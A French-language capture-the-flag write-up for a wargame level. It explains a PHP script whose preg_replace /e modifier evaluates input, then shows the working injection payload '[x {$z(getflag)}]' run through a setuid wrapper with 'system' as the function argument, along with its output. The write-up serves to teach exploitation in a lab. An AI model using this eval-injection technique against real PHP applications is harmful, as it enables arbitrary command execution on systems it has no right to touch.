# Level 06
Home:
```
$ ls -la
total 24
dr-xr-x---+ 1 level06 level06  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level06 level06  220 Apr  3  2012 .bash_logout
-r-x------  1 level06 level06 3518 Aug 30  2015 .bashrc
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
-r-x------  1 level06 level06  675 Apr  3  2012 .profile
```

L'executable level06 sert juste à lancer /bin/php avec les bonnes permissions et prend deux paramètre optionel.

Mais le plus interresant est le fichier level06.php qui nous montre une petite faille de sécurité à cause d'eval sur la ligne 11 (flag `/e`).
```php
#!/usr/bin/php
<?php
function y($m) {
	$m = preg_replace("/\./", " x ", $m);
	$m = preg_replace("/@/", " y", $m);
	return $m;
}

function x($y, $z) {
	$a = file_get_contents($y);
	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
	$a = preg_replace("/\[/", "(", $a);
	$a = preg_replace("/\]/", ")", $a);
	return $a;
}
$r = x($argv[1], $argv[2]);
print $r;
/*
Ligne 3-7 : La fonction y($m) est définie. Elle prend un paramètre $m qui est une chaîne de caractères. À l'intérieur de la fonction, deux appels à la fonction preg_replace sont effectués. Le premier appel remplace tous les points (.) par la chaîne de caractères " x ", et le deuxième appel remplace tous les caractères "@" par le caractère "y". Ensuite, la fonction retourne la valeur de $m modifiée.

Ligne 9-15 : La fonction x($y, $z) est définie. Elle prend deux paramètres, $y et $z. À l'intérieur de la fonction, le contenu du fichier spécifié par $y est lu à l'aide de la fonction file_get_contents et stocké dans la variable $a. Ensuite, plusieurs appels à la fonction preg_replace sont effectués pour modifier le contenu de $a. Le premier appel utilise une expression régulière pour rechercher des occurrences de "[x quelque_chose]" et les remplace par le résultat de l'appel à la fonction y("quelque_chose"). Les autres appels à preg_replace remplacent simplement les crochets "[" et "]" par des parenthèses "(" et ")". Enfin, la fonction retourne la valeur modifiée de $a.
*/
?>

```

Selon le doc des [String interpolation](https://wiki.php.net/rfc/deprecate_dollar_brace_string_interpolation), elle nous dit qu'on peut exécuter des fonctions que contiennent une variable.</Br>
Donc on a supposé qu'on pouvait exécuter n'importe quelle fonction contenue dans le variable `z` de la fonction `x`.

Voici le premier argument qu'on donne à l'exécutable `[x {$z(getflag)}]`, celle-ci récupère le contenu de `z` et exécute la avec comme argument `getflag` et comme deuxième argument la fonction qu'on veut `system`.

*La commande finale a exécuté:*
```sh
echo '[x {$z(getflag)}]' > /tmp/exploit; ./level06 /tmp/exploit 'system'
```
```
$ ./level06 /tmp/exploit system
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
Check flag.Here is your token : xxx
```
